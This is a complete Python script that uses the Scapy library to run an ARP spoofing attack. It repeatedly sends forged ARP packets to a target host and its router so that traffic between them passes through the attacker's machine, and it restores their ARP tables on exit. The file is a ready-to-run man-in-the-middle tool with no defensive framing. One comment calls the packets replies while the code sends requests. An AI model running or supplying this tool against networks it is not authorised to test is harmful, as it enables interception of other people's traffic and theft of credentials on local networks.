import sys
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, getmacbyip

# spoofing arp with sending arp reply packets
def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = ARP(op="who-has", psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

# restore arp table on the both machines 
def arp_restore(dest_ip, dest_mac, source_ip, source_mac): # Optional beacuse victim and router automaticly will set up old variables
    packet = ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    sendp(Ether(dst=dest_mac)/packet, verbose=False)

def main():
    # get args from terminal
    target_ip = sys.argv[1]
    router_ip = sys.argv[2]

    target_mac = getmacbyip(target_ip)
    router_mac = getmacbyip(router_ip)
    try:
        print("[+] Sending spoofed ARP packets...")
        while True:
            arp_spoof(
                dest_ip=target_ip,
                dest_mac=target_mac,
                source_ip=router_ip)
            arp_spoof(
                dest_ip=router_ip,
                dest_mac=router_mac,
                source_ip=target_ip
            )
    except KeyboardInterrupt:
        print("[+] Restoring ARP Tables...")
        arp_restore(dest_ip=router_ip, dest_mac=router_mac, source_ip=target_ip, source_mac=target_mac)
        arp_restore(dest_ip=target_ip, dest_mac=target_mac, source_ip=router_ip, source_mac=router_mac)
        print("[-] End of spoofing!")
        quit()
    
main()
